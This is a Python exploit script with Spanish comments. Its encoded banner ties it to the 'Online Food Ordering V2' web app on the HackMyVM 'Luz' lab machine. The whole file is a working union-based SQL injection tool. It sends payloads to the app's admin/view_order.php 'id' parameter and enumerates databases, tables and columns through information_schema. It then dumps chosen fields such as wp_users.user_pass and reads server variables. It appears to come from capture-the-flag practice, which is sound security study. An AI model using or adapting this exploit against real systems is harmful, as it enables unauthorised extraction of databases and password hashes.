#!/usr/bin/python3

import requests
import argparse
import signal
import base64
import sys
import re
from prettytable import PrettyTable

def forced_exit(sig, frame):
    print("\nSaliendo...")
    exit(0)

signal.signal(signal.SIGINT, forced_exit)

def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument(dest="ip_victim", help="IP de la máquina víctima.")
    parser.add_argument('-q', '--query', dest="query", nargs="*", help="Extracción SQL: Descubrir DBs, tablas, columnas y datos.")
    parser.add_argument('--var', dest="sql_var", help="Extracción SQL: Variables de entorno.")
    return parser.parse_args()

class FoodOrderOnlineSQLiUnionBased:

    def __init__(self):
        self.proxies = {"http":"http://127.0.0.1:8080"}

    def execute_request(self, message, tmp_payload):
        old_result = ""
        result = ""

        # Creación de tabla ----
        table = PrettyTable()

        if type(message) is list:
            table.field_names = message
        else:
            table.field_names = [message]

        table.align = 'l' # left
        # -----------------------

        for row in range(0,100): # En caso de existir 100 filas
            payload = tmp_payload.replace('RRROOOWWW', str(row))

            data_get = {"id" : f"1 UNION ALL SELECT 1,2,3,4,5,6,CONCAT('aca_esta_el_leak:',(SELECT {payload})),8,9,10,11-- -"}
            r = requests.get(self.url + '/admin/view_order.php', params=data_get)

            try:
                result = re.findall(r'aca_esta_el_leak:(.*?)<',r.text)[0]
            except:
                pass

            if result == "":
                print("(-) No hay resultados para esta consulta")
                exit(1)
            elif result == old_result:
                break
            else:
                table.add_row(result.split('£')) # Separamos la cadena por ese caracter (que es poco habitual) para evitar sorpresas en respuestas

            old_result = result

        print("(+) Consulta SQL:", data_get["id"], "\n")
        print(table)

    def extract_db_variables(self, env_var):
        self.execute_request(env_var, env_var)

    def extract_db_databases(self):
        payload = "schema_name FROM information_schema.schemata LIMIT RRROOOWWW,1"

        self.execute_request("* Bases de datos *", payload)

    def extract_db_tables(self, database):
        hex_database = database[0].encode('utf-8').hex()
        payload = "table_name FROM information_schema.tables WHERE table_schema IN (0x%s) LIMIT RRROOOWWW,1" % (hex_database)

        self.execute_request(f"* Tablas - {database[0]} *", payload)

    def extract_db_columns(self, db_table):
        hex_database = db_table[0].encode('utf-8').hex()
        hex_table = db_table[1].encode('utf-8').hex()
        payload = f"column_name FROM information_schema.columns WHERE table_schema IN (0x%s) AND table_name IN (0x%s) LIMIT RRROOOWWW,1" % (hex_database, hex_table)

        self.execute_request(f"* Columnas - {db_table[0]}.{db_table[1]} *", payload)

    def extract_db_info(self, db_table_column):
        # Para extraer varios campos en la misma query, concatenamos con £ ya que es un caracter poco común.
        array_with_fields = db_table_column[2].split(',')
        fields_to_concat = ",'£',".join(array_with_fields)

        payload = f"CONCAT(%s) FROM %s.%s LIMIT RRROOOWWW,1" % (fields_to_concat, db_table_column[0], db_table_column[1])

        self.execute_request(array_with_fields, payload)

    def print_help(self):
        print(f"uso: {sys.argv[0]} IP [OPTIONS]")
        print("\nejemplo:\n  Bases de datos:  %s 10.10.10.10 -q" % (sys.argv[0]))
        print(f"  Tablas:          {sys.argv[0]} 10.10.10.10 -q blog")
        print(f"  Columnas:        {sys.argv[0]} 10.10.10.10 -q blog wp_users")
        print(f"  Campo de tabla:  {sys.argv[0]} 10.10.10.10 -q blog wp_users user_pass")
        print(f"  Variables:       {sys.argv[0]} 10.10.10.10 --var 'user()'")
        exit(1)

    def main(self):
        args = arguments()
        self.url = f"http://{args.ip_victim}"

        banner = base64.b64decode("CuKVkyAgIOKVpSAg4pWl4pSA4pSA4pSA4pWWCuKVkSAgIOKVkSAg4pWRICAg4pWrCuKVqyAgIOKVqyAg4pWR4pWT4pSA4pSA4pWcCuKVmeKUgOKUgOKUgOKVmeKUgOKUgOKVnOKVmeKUgOKUgOKUgOKAoiBieSBsYW56CgpIYWNrTXlWTSAtIEx1eiA6OiBPbmxpbmUgRm9vZCBPcmRlcmluZyBWMiA6OiBTUUwgSW5qZWN0aW9uIFVuaW9uLUJhc2VkCg==").decode()
        print(banner)

        try:
            if args.sql_var:
                self.extract_db_variables(args.sql_var)
            elif len(args.query) == 0:
                self.extract_db_databases()
            elif len(args.query) == 1:
                self.extract_db_tables(args.query)
            elif len(args.query) == 2:
                self.extract_db_columns(args.query)
            elif len(args.query) == 3:
                self.extract_db_info(args.query)
            else:
                self.print_help()
        except TypeError as err:
            self.print_help()

if __name__ == '__main__':
    FoodOrderOnlineSQLiUnionBased().main()